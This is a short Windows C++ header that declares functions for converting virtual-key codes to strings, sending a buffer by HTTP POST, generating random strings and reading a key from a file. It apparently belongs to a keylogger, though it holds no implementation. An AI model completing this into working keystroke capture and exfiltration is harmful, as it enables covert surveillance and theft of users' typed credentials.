#pragma once

#include <string>
#include <thread>
#include <tchar.h>
#include <random>
#include <iostream>
#include <strsafe.h>
#include <stdio.h>
#include <windows.h> 
#include <wininet.h>
#include <wbemidl.h>
#include <tchar.h>
#pragma comment(lib, "wbemuuid.lib");

#define _WIN32_DCOM
#define sleep(_time) (std::this_thread::sleep_for(std::chrono::milliseconds(_time))) 

// PROTOS
LPCSTR random_string(size_t length);
STRSAFE_LPSTR vkCodeToString(INT vkCode);
DWORD postRequest(CHAR *buffer);
DWORD getKeyFromFile(CHAR *buffer);